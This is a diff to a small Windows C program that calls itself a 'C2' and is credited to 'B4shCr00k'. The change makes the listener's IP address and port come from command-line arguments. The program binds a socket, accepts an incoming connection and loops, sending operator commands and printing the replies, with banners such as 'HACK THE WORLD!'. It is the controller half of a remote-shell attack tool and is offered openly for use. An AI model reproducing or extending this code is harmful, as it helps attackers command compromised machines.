@@ -5,22 +5,33 @@
 #include <ws2tcpip.h>
 #pragma comment (lib, "Ws2_32.lib")
 
-int main()
+int main(int argc,char *argv[])
 {
 	SOCKET sock;
 	struct sockaddr_in sock_addr;
-    	char recvserver[7000];
+    char recvserver[7000];
    	char command[7000];
 	WSADATA wsa;
-	char ip_addr[] = "0.0.0.0";
-	int port = 0000;
+
+    printf("[!] Usage : ./C2 [IP] [PORT]\n[!] Press Enter To Continue ;)\n");
+    getchar();
+    if (argc != 3 )
+    {
+        printf("[*] ERROR >> Usage : ./C2 [IP] [PORT]\n");
+        return 1;
+    }
+    char *ipaddr = argv[1];
+    int portnum = atoi(argv[2]); 
+    
+	
+	
 
 	WSAStartup(MAKEWORD(2,2),&wsa);
 	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);
 
-	sock_addr.sin_port = htons(port);
+	sock_addr.sin_port = htons(portnum);
 	sock_addr.sin_family = AF_INET;
-	sock_addr.sin_addr.s_addr = inet_addr(ip_addr);
+	sock_addr.sin_addr.s_addr = inet_addr(ipaddr);
     
     int btest = bind(sock,(struct sockaddr*)&sock_addr,sizeof(sock_addr));
     printf("[!] From Dust To DusT !!!\n[!] Made By B4shCr00k\n[!] Type exit To Leave\n");
@@ -47,7 +58,7 @@ int main()
    
     struct sockaddr_in client_addr;
     int clientaddrsize = sizeof(client_addr);
-
+    
     SOCKET baccept = accept(sock,(struct sockaddr*)&client_addr,&clientaddrsize);
     printf("[!] Accepting Socket\n");
     if (baccept < 0)
@@ -70,11 +81,12 @@ int main()
             printf("HACK THE WORLD!");
             break; 
         }
+	    
         Sleep(500);
         recv(baccept,recvserver,sizeof(recvserver),0);
         printf("%s",recvserver);
+
     }
-    
     WSACleanup();
     closesocket(sock);
     closesocket(baccept);
